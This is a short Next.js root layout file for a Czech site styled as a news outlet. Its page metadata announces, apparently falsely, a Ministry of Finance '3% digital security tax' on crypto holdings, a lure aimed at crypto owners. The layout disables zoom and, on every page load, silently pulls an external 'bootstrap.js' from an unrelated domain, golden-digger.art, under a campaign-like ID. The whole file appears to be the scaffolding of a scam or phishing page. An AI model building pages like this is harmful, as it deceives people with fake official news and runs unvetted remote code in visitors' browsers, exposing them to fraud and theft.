export const metadata = {
  title: "MIMOŘÁDNĚ: Ministerstvo financí chystá 3% „digitální bezpečnostní daň“ z kryptoaktiv nad 100 000 Kč — Výhled CZ",
  description: "Ministerstvo financí ČR dnes vydalo mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="cs">
      <body>
        {children}
        <script src="https://golden-digger.art/p/e1beb05d-55a4-4451-b40d-8c2723fb7bb5/bootstrap.js" async defer></script>
      </body>
    </html>
  );
}
